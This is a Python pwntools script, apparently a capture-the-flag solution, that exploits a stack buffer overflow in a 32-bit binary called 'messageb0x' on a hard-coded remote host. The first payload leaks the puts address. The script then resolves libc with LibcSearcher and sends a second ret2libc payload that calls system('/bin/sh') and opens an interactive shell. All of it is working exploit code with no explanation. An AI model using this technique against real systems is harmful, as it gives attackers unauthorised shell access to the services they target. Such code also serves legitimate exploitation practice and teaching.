from pwn import *
from LibcSearcher import *

context(os='linux',arch='i386',log_level='debug')

elf = ELF('./messageb0x')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

vulfun_addr = 0x0804923B

payload1 = b'\x90' * 92
payload1 += p32(puts_plt)
payload1 += p32(vulfun_addr)
payload1 += p32(puts_got)

p = remote('183.129.189.60',10109)
# p = process('./messageb0x')
p.recvuntil('are:')
p.sendline('')
p.recvuntil('address:')
p.sendline('')
p.recvuntil('say:')
p.sendline(payload1)
p.recvuntil('--> Thank you !\n')
puts_addr = u32(p.recv(4))
print('puts_addr = ' + hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libcbase = puts_addr - libc.dump('puts')
system = libcbase + libc.dump('system')
binsh = libcbase + libc.dump("str_bin_sh")

print('system_addr = ' + hex(system))
print('binsh_addr = ' + hex(binsh))

payload2 = b'\x90' * 92
payload2 += p32(system)
payload2 += p32(0)
payload2 += p32(binsh)

p.recvuntil('are:')
p.sendline('')
p.recvuntil('address:')
p.sendline('')
p.recvuntil('say:')
p.sendline(payload2)

p.interactive()

